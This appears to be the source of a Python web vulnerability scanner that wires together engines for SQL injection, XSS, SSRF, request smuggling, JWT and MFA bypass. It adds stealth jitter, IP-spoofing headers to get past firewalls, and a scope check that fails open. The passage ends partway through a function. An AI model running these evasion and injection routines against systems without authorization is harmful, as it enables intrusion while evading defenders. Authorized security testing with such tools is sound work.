"""
BugScan ELITE -- Scanner v5
Auth-aware, WAF-bypass, stealth, OOB, notifications, fingerprint-auto-select.
"""
import subprocess, queue, json, os, re, shutil, tempfile, time, logging
import urllib.request, urllib.parse, urllib.error, ssl, socket, base64
import hashlib, threading, html
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── HTTP Session Pool ─────────────────────────────────────────────────────────
try:
    import requests as _requests_lib
    import urllib3 as _urllib3
    _urllib3.disable_warnings()
    _http_session = _requests_lib.Session()
    _http_session.verify = False
    _http_adapter = _requests_lib.adapters.HTTPAdapter(
        pool_connections=50, pool_maxsize=200,
        max_retries=_requests_lib.adapters.Retry(
            total=1,                        # only 1 retry (down from 2)
            backoff_factor=0.1,             # fast (down from 0.5)
            status_forcelist=[429, 503],    # only retry on rate-limit / unavailable
            allowed_methods=["GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"],
            raise_on_status=False,
            # Do NOT retry on connection errors (DNS failures, refused, etc.)
            # This stops the retry storm on invalid hostnames like "verce;.com"
        )
    )
    _http_session.mount("http://",  _http_adapter)
    _http_session.mount("https://", _http_adapter)
    _POOL_AVAILABLE = True
except ImportError:
    _http_session = None
    _POOL_AVAILABLE = False
# Logger — defined FIRST before any imports that use it
log = logging.getLogger("bugscan.scanner")

# New $5M engines
try:
    from engine.stored_xss    import check_stored_xss
    from engine.host_header   import check_host_header_injection, check_web_cache_deception
    from engine.race_condition import check_race_conditions
    from engine.websocket_scan import check_websocket
    from engine.business_logic import check_business_logic
    from engine.jwt_deep       import check_jwt_deep
    from engine.ssrf_cloud     import check_ssrf_cloud
    from engine.graphql_deep   import check_graphql_deep
    from engine.dep_confusion  import check_dep_confusion
    from engine.mfa_bypass     import check_mfa_bypass
    from engine.smuggling_deep import check_smuggling_deep
    from engine.cors_deep      import check_cors_deep
    from engine.takeover_deep    import check_takeover_deep
    from engine.ssti_deep        import check_ssti_deep
    from engine.bxss             import (check_bxss_headers, check_bxss_forms,
                                          check_bxss_json, get_bxss_host)
    from engine.waf              import check_waf, detect_waf, get_waf_bypass_headers
    from engine.sqli_tools       import run_sqli_tools, _run_sqlmap, _run_ghauri, check_sqli_blind, check_sqli_time_based
    from engine.xss_fuzz         import run_xss_stack, run_kxss, run_dalfox
    from engine.oauth_deep       import check_oauth_deep, check_oauth_pkce
    from engine.mfa_deep         import check_mfa_deep
    from engine.mfa_bypass       import check_mfa_bypass
    from engine.http2_smuggling  import check_http2_smuggling, check_h2_smuggling
    from engine.graphql_deep     import check_graphql_exploit_chain, check_graphql_deep, check_graphql_introspection
    from engine.nuclei_gen       import generate_from_scan_results
    from engine.stored_xss       import check_stored_xss
    from engine.host_header      import check_host_header_injection
    from engine.client_logic     import check_web_cache_deception
    from engine.race_condition   import check_race_conditions
    from engine.business_logic   import check_business_logic
    from engine.jwt_deep         import check_jwt_deep, check_jwt_alg_confusion, check_jwt_none_alg
    from engine.ssrf_cloud       import check_ssrf_cloud, check_ssrf_aws, check_ssrf_gcp
    from engine.dep_confusion    import check_dep_confusion
    from engine.smuggling_deep   import check_smuggling_deep, check_te_cl, check_cl_te
    from engine.cors_deep        import check_cors_deep, check_cors_advanced
    from engine.takeover_deep    import check_takeover_deep
    from engine.ssti_deep        import check_ssti_deep, check_ssti_rce
    from engine.bxss             import check_bxss_headers, check_bxss_forms, check_bxss_json
    from engine.websocket_scan   import check_websocket
    from engine.js_analyzer      import analyze_all_js
    from engine.js_deep          import full_js_analysis
    from engine.chain            import detect_chains, find_chains
    from engine.secrets_engine   import scan_domain_js
    from engine.ai_analyst       import enhance_finding
    from engine.risk_engine      import score_finding
    from engine.fingerprint      import auto_select_bugs_from_db
    from engine.stealth          import get_stealth
    from engine.mutator          import get_mutator
    from engine.oob              import get_oob_client
    from engine.runtime_watchdog import clear_domain_stages
    from engine.xss_proof        import check_xss_proof_based
    from engine.oobzero          import check_sqli_oobzero
    from engine.smart_params     import (deduplicate_endpoints, classify_param,
                                          filter_params_for_testing, score_endpoint_priority)
    from engine.prompt_injection  import check_prompt_injection_supply_chain
    from engine.poc_gtfo          import enforce_poc_gtfo as _gtfo_check
    from engine.poc_gtfo          import auto_generate_poc as _auto_poc
    from engine.poc_gtfo          import generate_patch_suggestion as _patch_suggest
    _ELITE_ENGINES = True
except ImportError as e:
    log.warning(f"Elite engine import: {e}")
    _ELITE_ENGINES = False
from typing import List, Optional, Dict, Tuple
try:
    from engine.live_feed import testing as _feed_testing, result as _feed_result, info as _feed_info, phase as _feed_phase, get_limiter as _get_rate_limiter
except ImportError:
    def _feed_testing(*a,**kw): pass
    def _feed_result(*a,**kw): pass
    def _feed_info(*a,**kw): pass
    def _feed_phase(*a,**kw): pass
    def _get_rate_limiter(d, rps=15): return type("L",(object,),{"wait":lambda s:None})()


# DNS result cache — safe local cache, no monkey-patching
_DNS_CACHE: dict = {}

def _dns_resolve(host: str) -> str:
    """Cache-aware DNS resolution."""
    if host not in _DNS_CACHE:
        try:
            _DNS_CACHE[host] = socket.gethostbyname(host)
        except Exception:
            _DNS_CACHE[host] = host
    return _DNS_CACHE[host]
# ════════════════════════════════════════════════════════════════════
# EXTERNAL PAYLOAD FILES -- load from payloads/ directory
# ════════════════════════════════════════════════════════════════════
_PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")

def _load_payload_file(name: str) -> List[str]:
    """Load payloads from payloads/<name>.txt, return empty list if missing."""
    path = os.path.join(_PAYLOAD_DIR, name)
    try:
        with open(path) as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        log.info(f"[payloads] loaded {len(lines)} from {name}")
        return lines
    except FileNotFoundError:
        log.debug(f"[payloads] {name} not found, using built-ins")
        return []
    except Exception as e:
        log.warning(f"[payloads] {name}: {e}")
        return []



# ── Scope Guard ──────────────────────────────────────────────────────────────
try:
    from recon import _scope_guard_host as _sghost
except:
    def _sghost(h): return True, None

def _in_scope(url: str) -> bool:
    """Block scanning private IPs to prevent SSRF in scanner itself."""
    try:
        import urllib.parse as _up
        host = _up.urlparse(url).hostname or ""
        allowed, _ = _sghost(host)
        return allowed
    except: return True  # fail open (let scanner decide)

# ── APEX Intelligence ─────────────────────────────────────────────────────────
try:
    from engine.learning import (record_payload_hit, record_payload_try,
                                  record_target_vuln, record_param_intel,
                                  get_best_payloads, end_session)
    from engine.brain import get_brain, ApexBrain
    from engine.knowledge_graph import get_graph
    _APEX = True
except Exception as _apex_err:
    _APEX = False
    def record_payload_hit(*a,**k): pass
    def record_payload_try(*a,**k): pass
    def record_target_vuln(*a,**k): pass
    def record_param_intel(*a,**k): pass
    def get_best_payloads(*a,**k): return []
    def end_session(): pass
    def get_brain(): return None
    def get_graph(d): return None


# ── Lazy engine imports (fail gracefully if engines not loaded yet) ────────────
def _get_stealth():
    try:
        from engine.stealth import get_stealth
        return get_stealth()
    except: return None

def _get_notifier():
    try:
        from engine.notify import get_notifier
        return get_notifier()
    except: return None

def _get_oob():
    try:
        from engine.oob import get_oob_client
        return get_oob_client()
    except: return None

def _get_waf(domain: str, db=None):
    try:
        if db:
            meta = db.get_meta(domain)
            return meta.get("waf", {})
    except: pass
    return {}

# ── Tool finder ───────────────────────────────────────────────────────────────
def _which(n):
    p = shutil.which(n)
    if p: return p
    for d in [os.path.expanduser("~/go/bin"),"/home/kali/go/bin",
               "/root/go/bin","/usr/local/bin","/usr/bin","/snap/bin"]:
        fp = os.path.join(d,n)
        if os.path.isfile(fp) and os.access(fp,os.X_OK): return fp
    return None

def _env():
    e = os.environ.copy()
    e["PATH"]=":".join([os.path.expanduser("~/go/bin"),
        "/home/kali/go/bin","/root/go/bin","/usr/local/bin",
        "/snap/bin",e.get("PATH","")])
    return e

# ── HTTP helpers ──────────────────────────────────────────────────────────────
def _ctx():
    c = ssl.create_default_context()
    c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
    return c

# Global auth session (module-level defaults — single-scan backward compat)
_auth_session = None
_waf_info: Dict = {}
_stealth_engine = None

# Thread-local scan context.
# Each concurrent run_scan() writes its own auth/WAF/stealth here.
# _req() reads from _tl so batch scans cannot leak state across targets.
_tl = threading.local()

def _tl_auth():
    return getattr(_tl, 'auth_session', _auth_session)

def _tl_waf():
    return getattr(_tl, 'waf_info', _waf_info)

def _tl_stealth():
    return getattr(_tl, 'stealth_engine', _stealth_engine)

def _tl_h1_payloads(bug_type: str = "") -> list:
    """Per-thread H1 payload list for a bug type. Empty list if not loaded."""
    store = getattr(_tl, 'h1_payloads', {})
    if bug_type:
        return store.get(bug_type, [])
    return store

def _tl_h1_scores() -> dict:
    """Per-thread H1 score map {norm_path: score}. Empty dict if not loaded."""
    return getattr(_tl, 'h1_score_map', {})

_scan_stop = threading.Event()  # cooperative cancellation (legacy - kept for compat)
_scan_stop_events: dict = {}    # domain → threading.Event (per-scan stop)
_scan_stop_lock   = threading.Lock()

def _get_stop_event(domain: str) -> threading.Event:
    """Get or create a per-domain stop event."""
    with _scan_stop_lock:
        if domain not in _scan_stop_events:
            _scan_stop_events[domain] = threading.Event()
        return _scan_stop_events[domain]

def _clear_stop_event(domain: str):
    """Clear the stop event for a domain (scan starting)."""
    with _scan_stop_lock:
        _scan_stop_events[domain] = threading.Event()

def _set_stop_event(domain: str):
    """Signal a specific domain's scan to stop."""
    with _scan_stop_lock:
        if domain in _scan_stop_events:
            _scan_stop_events[domain].set()

def _cancelled(domain: str = None) -> bool:
    """Check if scan has been cancelled (global or domain-specific)."""
    if domain:
        with _scan_stop_lock:
            ev = _scan_stop_events.get(domain)
            if ev and ev.is_set():
                return True
    return _scan_stop.is_set()

def _req(url:str, method:str="GET", headers:dict=None, data:bytes=None,
         timeout:int=10, use_auth:bool=True, retries:int=2, allow_redirects:bool=True) -> Optional[Tuple]:
    """
    Auth-aware, stealth-aware, WAF-bypass-aware HTTP request.
    Proxy support via HTTP_PROXY / HTTPS_PROXY env vars.
    """
    # Read per-thread context (set by run_scan; falls back to module globals)
    _t_stealth = _tl_stealth()
    _t_auth    = _tl_auth()
    _t_waf     = _tl_waf()

    # Start with stealth headers (randomized UA etc.)
    if _t_stealth:
        h = _t_stealth.get_headers()
        _t_stealth.throttle(url)
    else:
        h = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9",
        }

    # Inject auth session cookies/token
    if use_auth and _t_auth and _t_auth.logged_in:
        if _t_auth.cookies:
            h["Cookie"] = _t_auth.cookie_header()
        if _t_auth.token:
            h["Authorization"] = f"{_t_auth.token_type} {_t_auth.token}"

    # WAF bypass headers (inject real IP spoofing headers)
    if _t_waf.get("detected") and _t_waf.get("bypass_headers"):
        for k, v in list(_t_waf["bypass_headers"].items())[:3]:
            h[k] = v

    if headers:
        h.update(headers)
    if data and "Content-Type" not in h:
        h["Content-Type"] = "application/x-www-form-urlencoded"

    # Fast path: use requests.Session pool
    if _POOL_AVAILABLE and _http_session is not None:
        try:
            _h = dict(headers or {})
            if _t_stealth:
                try: _h.update(_t_stealth.get_headers())
                except: pass
            _prx = os.environ.get("HTTP_PROXY","") or os.environ.get("HTTPS_PROXY","")
            _resp = _http_session.request(
                method, url, headers=_h, data=data,
                timeout=timeout, allow_redirects=allow_redirects,
                proxies={"http":_prx,"https":_prx} if _prx else None,
                verify=False
            )
            _body = _resp.text[:65536]
            if _t_stealth:
                try:
                    from urllib.parse import urlparse as _up2
                    (_t_stealth.on_429 if _resp.status_code==429
                     else _t_stealth.on_success)(_up2(url).netloc)
                except: pass
            return _resp.status_code, dict(_resp.headers), _body
        except Exception as _pe:
            pass  # fall through to urllib

    try:
        req = urllib.request.Request(url, data=data, headers=h, method=method)

        # Proxy support
        _proxy = os.environ.get("HTTP_PROXY") or os.environ.get("HTTPS_PROXY","")
        if _proxy:
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({"http": _proxy, "https": _proxy}),
                urllib.request.HTTPSHandler(context=_ctx())
            )
            resp = opener.open(req, timeout=timeout)
            body = resp.read(32768).decode("utf-8","ignore")
            return resp.status, dict(resp.headers), body

        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            body = r.read(32768).decode("utf-8","ignore")
            if _t_stealth:
                try:
                    from urllib.parse import urlparse
                    _t_stealth.on_success(urlparse(url).netloc)
                except: pass
            return r.status, dict(r.headers), body
    except urllib.error.HTTPError as e:
        if e.code == 429 and _t_stealth:
            try:
                from urllib.parse import urlparse
                _t_stealth.on_429(urlparse(url).netloc)
            except: pass
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except Exception: return None

def _req_bypass(url:str, method:str="GET", headers:dict=None,
                data:bytes=None, timeout:int=10) -> Optional[Tuple]:
    """
    Try request with each WAF bypass strategy until one gets through.
    Falls back to normal _req if no WAF detected.
    """
    _waf = _tl_waf()  # per-thread WAF info
    if not _waf.get("detected"):
        return _req(url, method, headers, data, timeout)

    strategies = _waf.get("strategies",[])
    # First try normal
    r = _req(url, method, headers, data, timeout)
    if r and r[0] not in (403, 406, 429, 503):
        return r

    # WAF blocked -- try bypass strategies
    try:
        from engine.waf import apply_bypass
        # Try URL-level bypasses
        for strategy in strategies[:4]:
            bypass_url = url
            # Try adding bypass headers
            bypass_h = dict(headers or {})
            if strategy == "header_spoofing":
                bypass_h.update({
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "CF-Connecting-IP": "127.0.0.1",
                })
            elif strategy == "chunked_encoding":
                bypass_h["Transfer-Encoding"] = "chunked"
            r = _req(bypass_url, method, bypass_h, data, timeout)
            if r and r[0] not in (403, 406, 429, 503):
                log.debug(f"[bypass] {strategy} worked for {url}")
                return r
    except Exception as e:
        log.debug(f"bypass attempt: {e}")

    return r  # return whatever we got

def _req_capture(url: str, method: str = "GET",
                 headers: dict = None, data: bytes = None,
                 timeout: int = 10) -> tuple:
    """
    Like _req() but also returns the raw request string for evidence capture.
    Returns: (status, headers, body, raw_request_str, raw_response_str)
    Returns None if request failed.
    """
    import io as _io_mod
    # Build raw request string for evidence
    h = headers or {}
    raw_req_lines = [f"{method} {url} HTTP/1.1"]
    try:
        from urllib.parse import urlparse as _up3
        p = _up3(url)
        raw_req_lines[0] = f"{method} {p.path or '/'}{'?' + p.query if p.query else ''} HTTP/1.1"
        raw_req_lines.append(f"Host: {p.netloc}")
    except: pass
    for k, v in h.items():
        raw_req_lines.append(f"{k}: {v}")
    if data:
        raw_req_lines.append(f"Content-Length: {len(data)}")
        raw_req_lines.append("")
        raw_req_lines.append(data.decode("utf-8","ignore")[:500])
    raw_request = "\n".join(raw_req_lines)

    result = _req(url, method, headers=headers, data=data, timeout=timeout)
    if not result:
        return None

    status, resp_headers, body = result
    # Build raw response string
    raw_resp_lines = [f"HTTP/1.1 {status}"]
    for k, v in (resp_headers or {}).items():
        raw_resp_lines.append(f"{k}: {v}")
    raw_resp_lines.append("")
    raw_resp_lines.append(body[:800] if body else "")
    raw_response = "\n".join(raw_resp_lines)

    return status, resp_headers, body, raw_request, raw_response


def _get(url, **kw): return _req(url, "GET", **kw)

def _req_retry(url:str, method:str="GET", headers:dict=None, data:bytes=None,
               timeout:int=12, use_auth:bool=True, retries:int=2) -> Optional[Tuple]:
    """_req with exponential backoff retry — use for critical scan payloads."""
    import time as _t
    last_err = None
    for attempt in range(retries + 1):
        try:
            result = _req(url, method, headers, data, timeout, use_auth)
            if result is None and attempt < retries:
                _t.sleep(0.5 * (2 ** attempt))  # 0.5s, 1s, 2s
                continue
            # Retry on connection errors / 5xx / 429
            if result and result[0] in (429, 503, 502, 500) and attempt < retries:
                wait = float(dict(result[1] or {}).get("Retry-After", 0.5 * (2 ** attempt)))
                _t.sleep(min(wait, 10))
                continue
            return result
        except Exception as e:
            last_err = e
            if attempt < retries:
                _t.sleep(0.5 * (2 ** attempt))
    return None


def _jitter_sleep(base: float = 0.05) -> None:
    """Random sleep to avoid detection and rate limits."""
    import random as _rnd
    time.sleep(base + _rnd.uniform(0, base))
def _post(url, data=None, **kw): return _req(url, "POST", data=data, **kw)
def _get_b(url, **kw): return _req_bypass(url, "GET", **kw)  # bypass-aware GET

def _tmp(lines):
    f=tempfile.NamedTemporaryFile(mode="w",suffix=".txt",delete=False)
    for l in lines:
        if l: f.write(str(l).strip()+"\n")
    f.close(); return f.name

def _rm(p):
    try: os.unlink(p)
    except: pass

def _ts(): return time.strftime("%Y-%m-%dT%H:%M:%SZ")


# CWE mapping for each bug type
_CVSS_MAP = {
    "rce":            (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Remote Code Execution"),
    "sqli":           (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
    "xxe":            (8.2, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "XML External Entity"),
    "ssrf":           (8.6, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "Server-Side Request Forgery"),
    "lfi":            (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Local File Inclusion"),
    "ssti":           (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Server-Side Template Injection"),
    "xss":            (6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Cross-Site Scripting"),
    "idor":           (8.1, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "Insecure Direct Object Reference"),
    "cors":           (7.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N", "CORS Misconfiguration"),
    "csrf":           (8.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "Cross-Site Request Forgery"),
    "jwt":            (8.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT Vulnerability"),
    "jwt_attack":     (9.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "JWT Algorithm Confusion"),
    "smuggling":      (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N", "HTTP Request Smuggling"),
    "cache_poison":   (8.2, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N", "Web Cache Poisoning"),
    "deserialization":(9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Insecure Deserialization"),
    "expose":         (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Sensitive Data Exposure"),
    "actuator":       (9.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Exposed Actuator Endpoint"),
    "log4shell":      (10.0,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Log4Shell RCE"),
    "spring4shell":   (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Spring4Shell RCE"),
    "oauth":          (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N", "OAuth Misconfiguration"),
    "redirect":       (6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Open Redirect"),
    "crlf":           (6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "CRLF Injection"),
    "nosqli":         (8.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "NoSQL Injection"),
    "prototype":      (7.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "Prototype Pollution"),
    "race_condition": (7.5, "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N", "Race Condition"),
    "mass_assign":    (8.8, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "Mass Assignment"),
    "takeover":       (8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "Subdomain Takeover"),
    "buckets":        (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Cloud Bucket Exposure"),
    "cve":            (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Known CVE"),
    "xxe_oob":        (8.2, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "XXE Out-of-Band"),
    "host_header":    (6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Host Header Injection"),
    "websocket":      (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "WebSocket Vulnerability"),
    "business_logic": (8.1, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "Business Logic Flaw"),
    "misconfig":      (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Security Misconfiguration"),
    "default":        (5.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "Security Issue"),
}

_CWE_MAP = {
    "xss":             ("CWE-79",  "Improper Neutralization of Input During Web Page Generation"),
    "stored_xss":      ("CWE-79",  "Stored Cross-Site Scripting"),
    "sqli":            ("CWE-89",  "SQL Injection"),
    "nosqli":          ("CWE-943", "NoSQL Injection"),
    "ssrf":            ("CWE-918", "Server-Side Request Forgery"),
    "ssrf_cloud":      ("CWE-918", "SSRF: Cloud Metadata Access"),
    "lfi":             ("CWE-22",  "Path Traversal"),
    "rce":             ("CWE-78",  "OS Command Injection"),
    "ssti":            ("CWE-94",  "Code Injection via Template Engine"),
    "xxe":             ("CWE-611", "XML External Entity Injection"),
    "idor":            ("CWE-639", "Authorization Bypass Through User-Controlled Key"),
    "bola":            ("CWE-639", "Broken Object Level Authorization"),
    "cors":            ("CWE-942", "Permissive Cross-domain Policy"),
    "cors_deep":       ("CWE-942", "Permissive Cross-domain Policy"),
    "redirect":        ("CWE-601", "URL Redirection to Untrusted Site"),
    "crlf":            ("CWE-93",  "Improper Neutralization of CRLF Sequences"),
    "jwt":             ("CWE-347", "Improper Verification of Cryptographic Signature"),
    "jwt_deep":        ("CWE-347", "JWT Algorithm Confusion"),
    "oauth":           ("CWE-287", "Improper Authentication"),
    "oauth_deep":      ("CWE-601", "OAuth Redirect URI Manipulation"),
    "saml":            ("CWE-290", "Authentication Bypass by Spoofing"),
    "deserialization": ("CWE-502", "Deserialization of Untrusted Data"),
    "fileupload":      ("CWE-434", "Unrestricted Upload of File with Dangerous Type"),
    "prototype":       ("CWE-1321","Improperly Controlled Modification of Object Prototype Attributes"),
    "smuggling":       ("CWE-444", "HTTP Request Smuggling"),
    "smuggling_deep":  ("CWE-444", "HTTP Request Smuggling"),
    "http2":           ("CWE-444", "HTTP/2 Request Smuggling"),
    "cache_poison":    ("CWE-349", "Acceptance of Extraneous Untrusted Data With Trusted Data"),
    "host_header":     ("CWE-20",  "Improper Input Validation"),
    "reset_poison":    ("CWE-640", "Weak Password Recovery Mechanism"),
    "mass_assign":     ("CWE-915", "Improperly Controlled Modification of Dynamically-Determined Object Attributes"),
    "business_logic":  ("CWE-840", "Business Logic Errors"),
    "race_condition":  ("CWE-362", "Race Condition"),
    "takeover":        ("CWE-350", "Reliance on Reverse DNS Resolution for Security-Critical Action"),
    "takeover_deep":   ("CWE-350", "Subdomain Takeover"),
    "expose":          ("CWE-538", "Insertion of Sensitive Information into Externally-Accessible File"),
    "misconfig":       ("CWE-16",  "Configuration"),
    "jsleak":          ("CWE-312", "Cleartext Storage of Sensitive Information"),
    "bxss":            ("CWE-79",  "Blind/Out-of-Band Cross-Site Scripting"),
    "dep_confusion":   ("CWE-427", "Uncontrolled Search Path Element"),
    "log4j":           ("CWE-917", "Log4Shell: JNDI Injection"),
    "spring4shell":    ("CWE-94",  "Spring Framework RCE"),
    "actuator":        ("CWE-200", "Exposure of Sensitive Information"),
    "graphql":         ("CWE-200", "GraphQL Introspection Enabled"),
    "graphql_deep":    ("CWE-89",  "GraphQL Injection"),
    "websocket":       ("CWE-345", "Insufficient Verification of Data Authenticity"),
    "mfa_bypass":      ("CWE-287", "MFA Bypass"),
    "panels":          ("CWE-200", "Exposed Admin Panel"),
    "buckets":         ("CWE-284", "Improper Access Control: Cloud Storage"),
    "waf":             ("CWE-693", "Protection Mechanism Failure"),
    "default":         ("CWE-0",   "Unknown Vulnerability"),
}

def F(bug,sev,url,title,**kw):
    """Build a finding dict -- all fields at top level for UI compatibility."""
    import hashlib as _hlib, json as _jmod
    _raw = _jmod.dumps({"bug":bug,"url":url,"param":kw.get("param",""),
                        "title":title[:80]}, sort_keys=True)
    _dkey = _hlib.sha256(_raw.encode()).hexdigest()[:16]
    _cwe_id, _cwe_name = _CWE_MAP.get(bug, _CWE_MAP["default"])
    # Confidence scoring: 0-100 based on evidence quality
    _confidence = kw.pop("confidence", None)
    if _confidence is None:
        # Auto-score based on evidence
        if kw.get("poc") and ("curl" in str(kw.get("poc","")) or "http" in str(kw.get("poc",""))):
            _confidence = 85  # Has working PoC
        elif kw.get("preview") and len(str(kw.get("preview",""))) > 50:
            _confidence = 70  # Has response preview
        elif kw.get("payload"):
            _confidence = 60  # Has payload but no proof
        else:
            _confidence = 50  # Heuristic detection
        # Boost for OOB confirmation
        if kw.get("oob_confirmed"): _confidence = 98
        # Reduce for time-based (could be slow server)
        if kw.get("time_based"): _confidence = max(40, _confidence - 20)
        # Reduce for pattern matching only
        if kw.get("pattern_only"): _confidence = max(30, _confidence - 25)

    _cwe_id, _cwe_name = _CWE_MAP.get(bug, _CWE_MAP["default"])
    _cvss_score, _cvss_vector, _cvss_label = _CVSS_MAP.get(bug, _CVSS_MAP["default"])
    # Override CVSS score by severity level if caller didn't specify
    _sev_cvss = {"critical": 9.8, "high": 7.5, "medium": 5.0, "low": 2.5, "info": 0.0}
    _effective_cvss = kw.pop("cvss", _cvss_score)
    finding = {
        "type":        bug,
        "bug":         bug,
        "bug_type":    bug,
        "severity":    sev,
        "url":         url,
        "title":       title,
        "description": title,
        "name":        f"{bug.upper()} -- {title[:80]}",
        "dedupe_key":  _dkey,
        "ts":          _ts(),
        "cwe_id":      _cwe_id,
        "cwe_name":    _cwe_name,
        "confidence":  _confidence,
        # CVSS v3.1
        "cvss_score":  _effective_cvss,
        "cvss_vector": _cvss_vector,
        "cvss_label":  _cvss_label,
        "cvss_display": f"CVSS {_effective_cvss} — {_cvss_label}",
        "details":     {"title": title, "cwe": _cwe_id, "confidence": _confidence,
                        "cvss": _effective_cvss, "cvss_vector": _cvss_vector, **kw},
    }
    for k, v in kw.items():
        finding[k] = v
    # Payload intelligence feedback: when a payload triggers a confirmed finding,
    # record the hit so future scans surface this payload earlier.
    # Non-blocking: any error here must not affect the finding itself.
    _hit_payload = kw.get("payload", "")
    if _hit_payload:
        try:
            from engine.payload_intel import record_payload_hit as _rph
            _rph(bug, _hit_payload)
        except Exception:
            pass  # payload_intel feedback is best-effort only
    return finding


# ════════════════════════════════════════════════════════════════════
# FINDINGS VALIDATION LAYER
# Each check must call _confirm_finding() before appending to results.
# Only confirmed bugs reach the Findings panel.
# ════════════════════════════════════════════════════════════════════

_INTERNAL_INDICATORS = [
    "ami-id", "instance-id", "computeMetadata", "169.254.169.254",
    "metadata.google.internal", "root:", "PONG", "127.0.0.1", "10.0.",
]
_SSRF_REDIRECT_PREFIXES = ["169.254", "127.0.0", "10.", "192.168.", "metadata"]


def _confirm_finding(bug_type: str, url: str, param: str, payload: str,
                     **evidence) -> dict:
    """
    Re-verify a candidate finding before it enters the Findings panel.
    Returns a dict: {"confirmed": bool, "proof": str, "confidence": int}

    SQLi  — sends payload twice; confirmed if response 2 takes ≥4.5s AND baseline <2s
    XSS   — re-fetches; confirmed if payload in body AND text/html AND not in comment
    SSRF  — confirmed if body contains internal indicator OR redirect to internal IP
    other — pass-through at medium confidence (60)
    """
    try:
        if bug_type in ("sqli", "blind_sqli", "time_sqli"):
            # Baseline: send clean URL
            _clean_url = url.split("?")[0] + "?" + "&".join(
                f"{k}=1" for k in (evidence.get("qs_keys") or [param])
            ) if "?" in url else url
            t0 = time.monotonic()
            _r0 = _get(_clean_url, timeout=8)
            baseline_time = time.monotonic() - t0

            if baseline_time >= 3.0:
                # Server itself is slow — cannot distinguish time-based
                return {"confirmed": False, "proof": f"baseline too slow ({baseline_time:.1f}s) — unconfirmable", "confidence": 30}

            # Inject payload
            import urllib.parse as _up
            _parsed = _up.urlparse(url)
            _qs = _up.parse_qs(_parsed.query)
            _qs[param] = [payload]
            _test_url = _up.urlunparse(_parsed._replace(query=_up.urlencode(_qs, doseq=True)))
            t1 = time.monotonic()
            _r1 = _get(_test_url, timeout=14)
            elapsed = time.monotonic() - t1

            if elapsed >= 4.5 and baseline_time < 2.0:
                return {
                    "confirmed": True,
                    "proof": f"time-delay confirmed: baseline={baseline_time:.2f}s payload={elapsed:.2f}s delta={elapsed-baseline_time:.2f}s",
                    "confidence": 92,
                    "endpoint": url, "payload": payload,
                }
            return {"confirmed": False, "proof": f"no delay (elapsed={elapsed:.2f}s baseline={baseline_time:.2f}s)", "confidence": 35}

        elif bug_type in ("xss", "stored_xss"):
